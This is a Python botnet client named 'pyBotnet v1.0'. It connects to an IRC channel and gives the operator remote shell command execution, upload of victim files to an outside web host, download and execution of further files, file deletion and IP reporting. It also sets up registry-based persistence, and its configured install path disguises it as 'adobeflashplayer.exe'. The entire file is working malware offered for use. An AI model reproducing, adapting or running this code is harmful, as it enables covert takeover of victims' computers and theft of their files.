#!/usr/bin/python
#-*- coding: utf-8 -*-
# pyBotnet v1.0
# creation date: 17/03/2016
# Social media:  https://www.facebook.com/msoliveroriginal
# Youtube Channel: https://www.youtube.com/channel/UCp9cDi1ibw7D8bjFMm6BZHQ
import sys
import os
import socket # For function conn(): && ipLocal():
import platform # For variable pcName
import random # For variable pcName
import glob # For function listArq(): list files on the computer
import re # For function getPublicIp(): Ip Location
from urllib import urlopen # For function getPublicIp(): Ip Location
import requests # For function upload(): File Upload
import urllib,urllib2 # For function download(): downloading files via http
import subprocess # For function run(): to execute program
import time, datetime# For function screenshot():

ircServer= "chat.freenode.net"	# Address Server Irc
ircChanne= " "			# Channel for Bot connect
ircPwdCha= " "					# Password of Channel, if there enter the password or leave blank
botAdmi= "Papa Father"				# A name for the welcome help, Not obligatory.
botPass= " "				# Not obligatory. A name for the welcome help
dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL that contains the php ARRAY to receive files via upload
urlFromUpShow = urlFromUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files

def persis():
	try:
		conv = os.path.realpath(__file__).replace('.py', '.exe')
		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Amarula" /t REG_SZ /F /D '+conv, shell=True)
		EnviaMsg(ircChanne, "[+] Registro alterado com sucesso [+]")
	except:
		EnviaMsg(ircChanne, "[+] Nao foi possivel alterar o registro [+]")
def delFileY():
	try:
		localisfile = glob.glob(delFile)
		if os.path.exists(delFile):
			for localisfile in localisfile:
				os.unlink(localisfile)
				EnviaMsg(ircChanne, "[+] Arquivo deletado com sucesso  " + "[ " + localisfile + " ] [+]")
		else:
			EnviaMsg(ircChanne, "[!] Ops! O arquivo nao existe " + "[ " + delFile + " ] [!]")
	except WindowsError:
		EnviaMsg(ircChanne, "[!] Porra! Nao foi possivel deletar o arquivo, provavelmente voce teve permissao negada [!]")
		EnviaMsg(ircChanne, str(WindowsError))
def run():
	if os.path.isfile(str(fileRun)) == True:
		subprocess.call(['start', fileRun], shell=True)
		EnviaMsg(ircChanne, fileRun + " executado com sucesso.")
	else:
		EnviaMsg(ircChanne, fileRun + " arquivo nao existe.")
def download():
#REFERENCIA http://stackoverflow.com/questions/1096379/how-to-make-urllstarib2-requests-through-tor-in-python
	if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
		try:
			file_name = urlDown.split('/')[-1]
			u = urllib2.urlopen(urlDown)
			f = open(file_name, 'wb')
			meta = u.info()
			file_size = int(meta.getheaders("Content-Length")[0])
			EnviaMsg(ircChanne, "[+] Baixando para o bot: %s - Tamanho: %s Bytes [+]" % (file_name, file_size))
			f.write(u.read())
			f.close()
			EnviaMsg(ircChanne, "[+] Download finalizado de: " + str(file_name) + " [+]")
		except IOError:
			EnviaMsg(ircChanne, "[!] Papa, Seu inutil! Voce nao tem privilegio para fazer o download. [!]")
	else:
		EnviaMsg(ircChanne, "Ops! Tente usar [http://] ou [https://] na URL")
def upload():
	global urlFromUpload, urlFromUpShow
	if os.path.exists(fileUp):
		files = {'file': open(fileUp, 'rb')}
		r = requests.post(urlFromUpload, files=files) #import requests
		EnviaMsg(ircChanne, "[+] Upload concluido com sucesso [+] para http:"+urlFromUpShow + fileUp)
	else:
		EnviaMsg(ircChanne, "[+] Apenas o vazio da existencia: O arquivo nao existe [+]" + "[ " + fileUp + " ]")
def getPublicIp():
	data = str(urlopen('http://checkip.dyndns.com/').read())
	return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
def ipLocal():
	addresses = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1]
	return addresses
def listArq():
	file = glob.glob('*.*')
	for file in file:
		EnviaMsg(ircChanne, "Arquivo: [ " + file + " " + str(os.path.getsize(file)) + " kb ]")
		time.sleep(0.8)

def shell():
	try:
		process = subprocess.Popen(args=comando,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell= True)
		outt = (process.communicate())
		out2 = outt[0]
		out3 = out2.split('\r\n')
		for item in (out3):
			item = item.replace("\x82", "?")
			item = item.replace("\xc6", "?")
			item = item.replace("\xa3", "?")
			item = item.replace("\xa1", "?")
			item = item.replace("\xa2", "?")
			item = item.replace("\x87", "?")
			item = item.replace("\x93", "?")
			item = item.replace("\xa0", "?")
			item = item.replace("\x88", "?")
			item = item.replace("\x83", "?")
			item = item.replace("\xc7", "?")
			item = item.replace("\xb8", "?")
			item = item.replace("\xad", "?")
			item = item.replace("\xef", "?")
			item = item.replace("\xa7", "?")
			item = item.replace("\xf5", "?")
			item = item.replace("\xf0", "?")
			item = item.replace("\xfc", "?")
			item = item.replace("\xa6", "?")
			EnviaMsg(ircChanne, item )
			time.sleep(1)
	except:
		EnviaMsg(ircChanne, "[!] Ocorreu um erro na execucao do comando [!]")

def conn():
#REFERENCIA http://stackoverflow.com/questions/25616545/python-irc-bot-not-returning-full-list-of-channels
	try:
		ircSock.connect((ircServer, 6665)) #6667
	except socket.error:
		conn()
	else:
		ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :ZuMbI\n"))
		ircSock.send(str.encode("NICK "+ botNick +"\n"))
def ping():
	ircSock.send (str.encode("PONG :pingis\n"))
def EnviaMsg(chan, msg):
	ircSock.send(str.encode("PRIVMSG " + chan +" :" + msg + "\n"))
def join(chan):
	ircSock.send(str.encode("JOIN " + chan + " " + ircPwdCha + "\n"))
def leaveChannel(chan):
	ircSock.send(str.encode("PART " + chan + " leaving the canal" + "\n"))
def quitIrc(chan):
	ircSock.send(str.encode("QUIT" + "\n"))
def main():
	global botAdmi, dir, comando, ircSock, botNick, fileUp, urlDown, fileRun, interval, delFile, outt, out2, out3
	pcName = platform.node()
	ircSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	botNick = pcName + "-" + str(random.randint(1, 10000))
	#time.sleep(40) # Wait Initialization of the network card - Uncomment the line
	conn()
	join(ircChanne)
	login = False
	while login != True:
		ircMsg = ircSock.recv(5000)
		ircMsgClean = ircMsg.strip(str.encode('\n\r'))
		ircSock.send(str.encode("NICK " + botNick + "\n"))
		print(ircMsgClean)
		if ircMsg.find(ircMsg.replace("PING ", "PONG")) !=-1:
			ping()
		if ircMsg.find(str.encode("login")) !=-1:
			try:
				p = ircMsgClean.split()
				pwd = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] tente: <login> <senha>")
			else:
				if pwd != botPass:
					EnviaMsg(ircChanne, "[!] Parado ai, vagabundo: Senha Invalida, ou voce nao pode logar [!]")
				else:
					EnviaMsg(ircChanne, "[+] Conectado: bot " + botNick + " aguardando por ordens, Mestre! [+]")
					login = True
	while True:
		ircMsg = ircSock.recv(5000)
		ircMsgClean = ircMsg.strip(str.encode('\n\r'))
		print(ircMsgClean)
		if ircMsg.find(str.encode("Nickname is already in use")) != -1:
			botNick = pc_name + str(random.randint(1,10000))
			ircSock.send(str.encode("NICK "+ botNick +"\n"))
			join(ircChanne)
		if ircMsg.find(str.encode("PING :")) != -1:
			ping()
		elif ircMsg.find(str.encode("sair")) != -1: # Command used for the bot leave the channel, but remains connected to the irc server
			leaveChannel(ircChanne)
		elif ircMsg.find(str.encode("matar")) != -1: # Command used for kill bot on irc server
			quitIrc(ircChanne)
			sys.exit()
		elif ircMsg.find(str.encode("help")) != -1: # Command used to display help for the user
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <help> <" + botNick +">")
			else:
				if id == botNick:
					EnviaMsg(ircChanne, "[+] Bem Vindo, Mestre " + botAdmi + " [+]")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [matar]    para matar os bots ativos")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [sair]     para que os bots ativos saiam do canal")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [dir]      para vizualizar o diretorio atual do zumbi")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [ls]       para listar o conteudo da pasta atual")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [ip]       para mostrar os ips do bot")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [upload]   para fazer upload de arquivos do bot")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [download] para baixar arquivos para o zumbi")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [run]      para executar um programa")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [shell]    para executar comandos no terminal")
					time.sleep(1)
					EnviaMsg(ircChanne, "use: [delete]   para excluir arquivos")
					time.sleep(1)

		elif ircMsg.find(str.encode("botnick")) != -1: # Command to get bot nickname
			EnviaMsg(ircChanne, "Nickname: " + botNick)
		elif ircMsg.find(str.encode("dir")) != -1: # Command to list the current directory of the bot
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <dir> <" + botNick +">")
			else:
				if id == botNick:
					EnviaMsg(ircChanne, "[+] Diretorio atual do zumbi: " + os.getcwd())
		elif ircMsg.find(str.encode("ls")) != -1: # Command to list the files in the current directory
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <ls> <" + botNick +">")
			else:
				if id == botNick:
					listArq()
		elif ircMsg.find(str.encode("ip")) != -1: # Command to get the host IP
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <ip> <" + botNick +">")
			else:
				if id == botNick:
					yx = getPublicIp()
					xy = ipLocal()
					EnviaMsg(ircChanne, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )
		elif ircMsg.find(str.encode("upload")) != -1: # Command to upload files
			try:
				p = ircMsgClean.split()
				fileUp = p[4]
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <upload> <Arquivo> <" + botNick +">")
			else:
				if fileUp == fileUp and id == botNick:
					EnviaMsg(ircChanne, "[+] Upload em andamento, aguarde um pouco. [+]")
					upload()
		elif ircMsg.find(str.encode("download")) != -1: # Command to download files to the host
			try:
				p = ircMsgClean.split()
				urlDown = p[4]
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <download> <link> <" + botNick +">")
			else:
				if urlDown == urlDown and id == botNick:
					download()
		elif ircMsg.find(str.encode("run")) != -1: # Command to execute files on the host
			try:
				p = ircMsgClean.split()
				fileRun = p[4]
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <run> <programa> <" + botNick +">")
			else:
				if fileRun == fileRun and id == botNick:
					run()

		elif ircMsg.find(str.encode("delete")) != -1: # Command to delete files
			try:
				p = ircMsgClean.split()
				delFile = p[4]
				id = p[5]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <delete> <arquivo> <" + botNick +">")
			else:
				if delFile == delFile and id == botNick:
					delFileY()

		elif ircMsg.find(str.encode("shell")) != -1:  # Command to execute files on the host
			try:
				p = ircMsgClean.split()
				print (p)
				comando = p[4:-1]
				comando = " ".join(comando)
				print (comando)

				id = p[-1]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <shell> <comando> <" + botNick + ">")
			else:
				if comando == comando and id == botNick:
					shell()
		elif ircMsg.find(str.encode("persistence")) != -1: # Para persistencia
			try:
				p = ircMsgClean.split()
				id = p[4]
			except IndexError:
				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <persistence> <" + botNick +">")
			else:
				if id == botNick:
					persis()
if __name__ == "__main__":
    main()
